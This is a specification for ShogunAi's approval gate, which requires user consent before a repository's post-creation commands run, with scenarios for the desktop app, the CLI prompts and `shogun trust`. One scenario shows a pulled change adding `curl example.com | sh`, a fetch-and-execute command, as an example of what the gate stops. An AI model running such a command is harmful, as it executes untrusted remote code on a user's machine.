# Spec Delta

## Purpose

Makes sure the commands a repository's `.shogunai.json` asks ShogunAi to run only run after the user on this machine has seen and approved them, and again whenever they change.

## ADDED Requirements

### Requirement: Approve a repository's post-creation commands
The system SHALL keep, per machine and per repository, the approved list of post-creation commands. An approval SHALL cover exactly the commands it was given: a different list, or the same commands in another order, SHALL count as not approved. Approvals SHALL be stored under the user's ShogunAi folder, readable and writable only by the user.

#### Scenario: Approved commands
- **WHEN** the user approved `[["npm", "install"]]` for `~/projects/main-repo` and `.shogunai.json` still declares it
- **THEN** the commands count as approved for every worktree of that repository

#### Scenario: Commands changed by a pull
- **WHEN** after the approval a pull changes the commands to `[["npm", "install"], ["sh", "-c", "curl example.com | sh"]]`
- **THEN** the commands count as not approved until the user approves the new list

#### Scenario: Another repository
- **WHEN** another repository declares the same commands
- **THEN** they count as not approved for it

### Requirement: Ask before running unapproved commands in the desktop app
When a creation or provisioning started from the desktop app reaches unapproved post-creation commands, the app SHALL show every command in full and let the user run them, which approves them, or skip them for this worktree. Skipping SHALL keep the worktree and report that the commands didn't run.

#### Scenario: Run and approve
- **WHEN** the user creates a worktree in a repository with unapproved commands and chooses to run them
- **THEN** the commands run, they are approved, and the next creation doesn't ask

#### Scenario: Skip
- **WHEN** the user chooses to skip them
- **THEN** the worktree is created with its files and environment, the commands don't run, and the app says so

### Requirement: Ask before running unapproved commands in the command line
`shogun new` and `shogun provision` SHALL, when standard input is a terminal, print the unapproved commands and ask for confirmation, running and approving them only on an explicit yes. When they can't ask, and always in `shogun hook herdr` and `shogun hook worktree-create`, they SHALL skip the commands, print a note on standard error that names `shogun trust`, and otherwise succeed.

#### Scenario: Interactive yes
- **WHEN** the user runs `shogun new TASK-123` on a terminal and answers yes
- **THEN** the commands run and are approved

#### Scenario: Interactive no
- **WHEN** the user answers no or just presses Enter
- **THEN** the worktree is created, the commands don't run, and the command exits with code 0

#### Scenario: Herdr creates a worktree
- **WHEN** Herdr's `worktree.created` event provisions a worktree of a repository with unapproved commands
- **THEN** files and environment are provisioned, the commands don't run, a note naming `shogun trust` goes to standard error, and the command exits with code 0

### Requirement: Review and approve from the command line
`shogun trust [path]` SHALL print the repository's post-creation commands and whether they are approved, and ask to approve them when standard input is a terminal. `shogun trust --yes` SHALL approve them without asking, and `shogun trust --revoke` SHALL remove the repository's approval.

#### Scenario: Approve from a script
- **WHEN** the user runs `shogun trust --yes` in `~/projects/main-repo`
- **THEN** the current commands are approved and later hooks run them

#### Scenario: Revoke
- **WHEN** the user runs `shogun trust --revoke`
- **THEN** the next creation asks again, or skips the commands where it can't ask

#### Scenario: Nothing to approve
- **WHEN** the repository declares no post-creation commands
- **THEN** the command says so and exits with code 0

### Requirement: Commands written from the desktop app are approved
When the user saves post-creation commands from the desktop app's project settings, the saved list SHALL be approved for that repository. Project settings SHALL show whether the repository's current commands are approved and let the user revoke the approval.

#### Scenario: Edited in settings
- **WHEN** the user adds `["npm", "install"]` in project settings and saves
- **THEN** the next creation runs it without asking

#### Scenario: Changed outside the app
- **WHEN** `.shogunai.json` changes its commands on disk after the save
- **THEN** project settings shows them as not approved
